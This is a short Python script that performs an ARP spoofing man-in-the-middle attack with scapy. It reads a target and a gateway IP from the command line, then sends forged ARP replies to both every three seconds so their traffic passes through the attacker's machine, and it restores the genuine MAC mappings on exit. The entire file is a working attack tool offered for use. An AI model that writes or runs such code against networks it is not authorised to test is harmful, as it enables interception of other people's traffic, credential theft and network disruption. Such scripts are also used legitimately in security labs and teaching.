import scapy.all as scapy
import time
import optparse


def get_user_datas():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target",help="please insert your target ip adress")
    parse_object.add_option("-g","--gateway",dest="gateway",help="please insert your modem ip adress")
    return parse_object.parse_args()
def arp_poison(target1_ip,target2_ip):
    target1_macadress=find_target_macadress(target1_ip)
    ARP_response=scapy.ARP(op=2,pdst=target1_ip,hwdst=target1_macadress,psrc=target2_ip)
    scapy.send(ARP_response,verbose=False)
    #scapy.ls(scapy.ARP())

def arp_healty(target1_ip,target2_ip):
    target1_macadress=find_target_macadress(target1_ip)
    target2_macadress=find_target_macadress(target2_ip)
    ARP_response=scapy.ARP(op=2,pdst=target1_ip,hwdst=target1_macadress,psrc=target2_ip,hwsrc=target2_macadress)
    scapy.send(ARP_response,verbose=False,count=8)
    #scapy.ls(scapy.ARP())

def find_target_macadress(target1_ip):
    arp_request=scapy.ARP(pdst=target1_ip)
    broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    compiled_packet=broadcast_packet/arp_request
    #(answer_packet,not_answer_packet)=scapy.srp(compiled_packet,timeout=1)
    answer_packet = scapy.srp(compiled_packet, timeout=1, verbose=False)[0]
    #print(answer_packet.summary())
    return (answer_packet[0][1].hwsrc)


print("Welcome to the MITM !!!")
(user_data,parameters)=get_user_datas()
#scapy.ls(scapy.ARP())
number_of_packets=0
try:
    while True:
        arp_poison(user_data.target,user_data.gateway)
        arp_poison(user_data.gateway,user_data.target)
        print("\rSending Packets..." + str(number_of_packets),end=" ")
        number_of_packets += 2
        time.sleep(3)

except KeyboardInterrupt:
    print("\n Quitting and Resetting(A true MAC Adress Shema is uploading to gateway and poisoned İP)")
    arp_healty(user_data.target, user_data.gateway)
    arp_healty(user_data.gateway, user_data.target)
